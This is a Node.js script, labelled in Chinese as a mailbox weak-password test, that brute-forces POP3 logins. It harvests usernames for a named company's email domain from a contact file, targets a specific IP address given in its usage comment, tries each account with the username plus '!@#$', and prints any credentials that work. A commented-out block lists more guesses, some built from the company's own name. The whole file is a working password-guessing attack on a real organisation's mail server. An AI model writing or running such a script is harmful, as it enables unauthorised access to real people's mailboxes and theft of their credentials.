// 信箱若口令测试
// node testPop3.js 125.71.203.220 110 /Users/xiatian/Desktop/mytels.txt
var pp = require('./pop3'),fs = require('fs');

process.setMaxListeners(0);
require('events').EventEmitter.prototype._maxListeners = 0;
require('events').EventEmitter.defaultMaxListeners = 0

var args = process.argv.splice(2);
// var port = 110, host = args[0],"125.71.203.220";
var port = args[1], host = args[0],
	async = require('async'),
	s = args[2];

fs.exists(s,function(bC)
{
	if(bC)
	{
		fs.readFile(s, 'utf8', function (err, s1) 
	    {
	        if (err) throw err;
	        else
	        {
	        	var rg = /pref:([^@\r\n\s]+)@yinhai\.com/gmi, a;
	        	a = rg.exec(s1);
	        	var szHz = "@yinhai.com";
	        	var aDt = [];
	        	// console.log(a);
	        	var fnCT = function(oT)
        		{
	        		var oR = new pp(oT);
	        		oR.getRst(function(bRst)
	        		{
	        			if(bRst)
	        			{
	        				console.log([oT.username,oT.password]);
	        			}
	        			delete oR;
	        		});
        		};
        		var g_aUs = [];
	        	while(a = rg.exec(s1))
	        	{
	        		g_aUs.push(a[1]);
	        	}
				async.mapLimit(g_aUs,13,function(s,fnCbk)
				{
					fnCbk();
					(function(a){
					fnCT({"port":port,"host":host,"username": a[1] + szHz, "password": a[1] + "!@#$"});
					/*
					fnCT({"port":port,"host":host,"username": a[1] + szHz,"password": a[1] + "!@#$1234"});
	        		fnCT({"port":port,"host":host,"username": a[1] + szHz, "password": "123456"});
	        		fnCT({"port":port,"host":host,"username": a[1] + szHz, "password": "123456789"});
	        		fnCT({"port":port,"host":host,"username": a[1] + szHz, "password": "jbgsn"});
	        		fnCT({"port":port,"host":host,"username": a[1] + szHz, "password": "Yinhai!@#$"});
	        		fnCT({"port":port,"host":host,"username": a[1] + szHz, "password": "Yinhai123"});
	        		fnCT({"port":port,"host":host,"username": a[1] + szHz, "password": "P@ssw0rd2013!"});
	        		fnCT({"port":port,"host":host,"username": a[1] + szHz, "password": "P@ssw0rd"});
	        		fnCT({"port":port,"host":host,"username": a[1] + szHz, "password": "yhP@ssw0rd"});
	        		*/
					})([,s]);
				});
	        }
	    });
	}
	else
	{
	    console.log(s + " 不存在");
	}
});